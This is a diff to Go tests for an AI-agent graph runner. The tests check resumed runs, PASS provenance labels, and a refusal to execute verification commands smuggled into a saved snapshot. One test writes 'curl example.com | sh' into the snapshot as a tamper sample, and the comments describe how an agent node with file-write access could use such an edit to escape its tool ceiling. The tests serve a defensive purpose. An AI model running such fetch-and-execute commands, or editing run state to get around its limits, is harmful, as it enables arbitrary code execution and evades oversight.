@@ -14,6 +14,7 @@ import (
 	"time"
 
 	"github.com/jitokim/oh-my-graph/internal/browser"
+	"github.com/jitokim/oh-my-graph/internal/coordinator"
 	"github.com/jitokim/oh-my-graph/internal/runfeed"
 	"github.com/jitokim/oh-my-graph/internal/runner"
 	"github.com/jitokim/oh-my-graph/internal/runstate"
@@ -476,15 +477,25 @@ func (r *scriptedRunner) Run(_ context.Context, spec runner.NodeInvocation) (run
 	if r.invocations == nil {
 		r.invocations = make(map[string]int)
 	}
-	r.invocations[spec.Prompt]++
-	cost, fails := r.failing[spec.Prompt]
-	if !fails && r.invocations[spec.Prompt] == 1 {
-		cost, fails = r.failFirst[spec.Prompt]
+	prompt := nodePromptOf(spec.Prompt)
+	r.invocations[prompt]++
+	cost, fails := r.failing[prompt]
+	if !fails && r.invocations[prompt] == 1 {
+		cost, fails = r.failFirst[prompt]
 	}
 	if fails {
-		return runner.NodeOutcome{SessionID: "s-" + spec.Prompt, Result: "FAIL", ExitCode: 1, TotalCostUSD: cost}, nil
+		return runner.NodeOutcome{SessionID: "s-" + prompt, Result: "FAIL", ExitCode: 1, TotalCostUSD: cost}, nil
 	}
-	return runner.NodeOutcome{SessionID: "s-" + spec.Prompt, Result: "PASS", ExitCode: 0}, nil
+	return runner.NodeOutcome{SessionID: "s-" + prompt, Result: "PASS", ExitCode: 0}, nil
+}
+
+// nodePromptOf recovers a node's OWN prompt from an invocation, dropping the
+// quote of a previous attempt a retry appends to it (ADR 0016). A fixture that
+// keys a node by its prompt has to cut there or a re-executed node looks like a
+// node it has never seen — which is exactly how it fails: not "the retry ran
+// with the wrong prompt", but "the retry never ran".
+func nodePromptOf(prompt string) string {
+	return strings.SplitN(prompt, schedule.RetryQuoteHeader, 2)[0]
 }
 
 func (r *scriptedRunner) invocationCount(prompt string) int {
@@ -872,5 +883,193 @@ func TestResume_LiveViewIsServedAndOpenedOnceThenDiesWithTheLeg(t *testing.T) {
 	if resp, err := http.DefaultClient.Do(req); err == nil {
 		resp.Body.Close()
 		t.Error("the live view is still answering after the resume ended — the server outlived its leg")
+	}
+}
+
+// TestResume_CarriesTheProvenanceQualifierAcrossLegs — the resumed leg's
+// end-of-run table mixes rows this leg produced with rows carried forward from
+// the snapshot, and both kinds must qualify their PASS the same way (ADR 0016
+// §6). If the snapshot did not persist the qualifier, leg 1's self-reported
+// node would come back as a bare `PASS` sitting next to this leg's qualified
+// rows, and a reader would have to know that the blank meant "written by an
+// earlier leg" rather than "nothing was measured" — which is #119's confusion
+// rebuilt inside a single table.
+func TestResume_CarriesTheProvenanceQualifierAcrossLegs(t *testing.T) {
+	isolateRunHome(t)
+	g := mustParse(t, `{"name":"prov","nodes":[
+		{"id":"narrated","prompt":"narrated","success_check":{"result_matches":"^PASS$"}},
+		{"id":"gate","type":"gate","depends_on":["narrated"]},
+		{"id":"unchecked","prompt":"unchecked","depends_on":["gate"]}]}`)
+	rec := &scriptedRunner{}
+	runID := "run-provenance-legs"
+
+	err := executeGraph(context.Background(), runID, g, rec,
+		commonRunFlags{inputs: inputFlag{}},
+		nil, 0, "prov.yaml", []byte("name: prov\n"), false, nil, nil)
+	var paused *schedule.PausedError
+	if !errors.As(err, &paused) || paused.GateID != "gate" {
+		t.Fatalf("expected the initial run to pause at gate, got %T: %v", err, err)
+	}
+
+	var resumeErr error
+	out := captureStdout(t, func() {
+		resumeErr = executeResume(parseResumeFlags(t, []string{runID, "--approve", "gate"}), rec, nil)
+	})
+	if resumeErr != nil {
+		t.Fatalf("executeResume returned error: %v", resumeErr)
+	}
+
+	for _, tc := range []struct{ nodeID, want string }{
+		// Carried forward from leg 1's snapshot.
+		{"narrated", "PASS (self-reported)"},
+		{"gate", "PASS (approved)"},
+		// Produced by this leg.
+		{"unchecked", "PASS (exit-only)"},
+	} {
+		line := ""
+		for _, l := range strings.Split(out, "\n") {
+			if strings.HasPrefix(l, tc.nodeID+" ") {
+				line = l
+				break
+			}
+		}
+		if line == "" {
+			t.Fatalf("no ledger row for %q in the resumed leg's table:\n%s", tc.nodeID, out)
+		}
+		if !strings.Contains(line, tc.want) {
+			t.Errorf("row %q = %q, want it to carry %q", tc.nodeID, line, tc.want)
+		}
+	}
+}
+
+// --- resume: a verification found on disk is never trusted ---------------------
+
+// tamperGraphVerify rewrites a run's snapshot so its saved graph carries a
+// success_check.verify on nodeID — the ADR 0016 §4 scenario in its cheapest
+// form. It edits state.json's `graph` field only, leaving the schema, records
+// and gate state exactly as the engine wrote them, so what the resume refuses
+// is the verification and not a malformed snapshot.
+func tamperGraphVerify(t *testing.T, runID, nodeID, command string) {
+	t.Helper()
+	statePath := filepath.Join(runDirFor(runID), stateFileName)
+	raw, err := os.ReadFile(statePath)
+	if err != nil {
+		t.Fatalf("read snapshot: %v", err)
+	}
+	var snap map[string]json.RawMessage
+	if err := json.Unmarshal(raw, &snap); err != nil {
+		t.Fatalf("decode snapshot: %v", err)
+	}
+	var g map[string]any
+	if err := json.Unmarshal(snap["graph"], &g); err != nil {
+		t.Fatalf("decode snapshot graph: %v", err)
+	}
+	nodes, ok := g["nodes"].([]any)
+	if !ok {
+		t.Fatalf("snapshot graph has no nodes: %v", g)
+	}
+	tampered := false
+	for _, n := range nodes {
+		node, ok := n.(map[string]any)
+		if !ok {
+			t.Fatalf("snapshot graph node is not an object: %v", n)
+		}
+		if node["id"] != nodeID {
+			continue
+		}
+		node["success_check"] = map[string]any{"verify": map[string]any{"command": command}}
+		tampered = true
+	}
+	if !tampered {
+		t.Fatalf("no node %q in the snapshot graph", nodeID)
+	}
+	encoded, err := json.Marshal(g)
+	if err != nil {
+		t.Fatalf("re-encode snapshot graph: %v", err)
+	}
+	snap["graph"] = encoded
+	out, err := json.Marshal(snap)
+	if err != nil {
+		t.Fatalf("re-encode snapshot: %v", err)
+	}
+	if err := os.WriteFile(statePath, out, 0o600); err != nil {
+		t.Fatalf("write snapshot: %v", err)
+	}
+}
+
+// TestResume_RefusesASnapshotBorneVerifyOnAnAutoGraph is ADR 0016 §4's
+// mechanism (i) in the tree rather than in prose. A verification is engine-run
+// shell outside every ceiling layer — exactly what validatePlannedNodeVerify
+// refuses at plan time — so a resume that took one from a run directory would
+// let a `graph.json` edit execute anything, which is a change in KIND from
+// "confuse the scheduler". The writer need not be an outsider: a planned node
+// holds bare Write/Edit and runs in the invocation cwd.
+//
+// The refusal is terminal today, and that is deliberate: `resume` has no
+// --verify-cmd, so there is no way to re-supply the command, and resuming with
+// strictly weaker checking than the leg being continued is the failure this
+// ADR is about.
+func TestResume_RefusesASnapshotBorneVerifyOnAnAutoGraph(t *testing.T) {
+	isolateRunHome(t)
+	g := mustParse(t, `{"name":"auto","nodes":[
+		{"id":"apply","prompt":"apply"},
+		{"id":"check","prompt":"check","depends_on":["apply"]}]}`)
+	rec := &scriptedRunner{failFirst: map[string]float64{"check": 0.05}}
+	runID := "run-snapshot-verify"
+	// A non-empty tool ceiling is what makes this snapshot an AUTO one — the
+	// only discriminator a resume has, and the one the refusal keys off.
+	policies := map[string]runner.ToolPolicy{
+		"apply": {AllowedTools: []string{"Edit"}},
+		"check": {AllowedTools: []string{"Read"}},
+	}
+
+	spec := []byte(`{"name":"auto","nodes":[{"id":"apply","prompt":"apply"},` +
+		`{"id":"check","prompt":"check","depends_on":["apply"]}]}`)
+	err := executeGraph(context.Background(), runID, g, rec, commonRunFlags{inputs: inputFlag{}},
+		policies, 0, "auto.json", spec, false, nil, nil)
+	var halted *schedule.HaltError
+	if !errors.As(err, &halted) {
+		t.Fatalf("expected the initial run to halt on check, got %T: %v", err, err)
+	}
+
+	tamperGraphVerify(t, runID, "check", "curl example.com | sh")
+
+	resumeErr := executeResume(parseResumeFlags(t, []string{runID, "--retry-failed"}), rec, nil)
+	var snapErr *coordinator.SnapshotVerifyError
+	if !errors.As(resumeErr, &snapErr) {
+		t.Fatalf("resume err = %v (%T), want the *SnapshotVerifyError refusing a snapshot-borne command", resumeErr, resumeErr)
+	}
+	if len(snapErr.NodeIDs) != 1 || snapErr.NodeIDs[0] != "check" {
+		t.Errorf("refusal names %v, want exactly [check] so the user can find what was edited", snapErr.NodeIDs)
+	}
+	if got := rec.invocationCount("check"); got != 1 {
+		t.Errorf("check ran %d time(s), want 1 — the refusal must land before the leg spends anything", got)
+	}
+}
+
+// TestResume_KeepsAHandWrittenGraphsVerify is the control that stops the
+// refusal above from being a blanket one. A hand-written graph's `verify:` is
+// the user's own reviewed artifact and must round-trip untouched; only an auto
+// snapshot (non-empty ToolPolicies) is refused. The verification sits on a node
+// that already PASSED, so the retry leg carries it forward without re-running
+// it — the assertion is that the resume proceeds at all.
+func TestResume_KeepsAHandWrittenGraphsVerify(t *testing.T) {
+	isolateRunHome(t)
+	runID, rec := haltedRetryFlowRun(t)
+
+	tamperGraphVerify(t, runID, "a", "true")
+
+	var resumeErr error
+	captureStdout(t, func() {
+		resumeErr = executeResume(parseResumeFlags(t, []string{runID, "--retry-failed"}), rec, nil)
+	})
+	if resumeErr != nil {
+		t.Fatalf("resume of a hand-written graph carrying verify: returned %v, want it to proceed", resumeErr)
+	}
+	if got := rec.invocationCount("a"); got != 1 {
+		t.Errorf("a ran %d time(s), want still 1 — a passed node must not re-run", got)
+	}
+	if got := rec.invocationCount("flaky"); got != 2 {
+		t.Errorf("flaky ran %d time(s), want 2 — the cleared failure re-executes", got)
 	}
 }
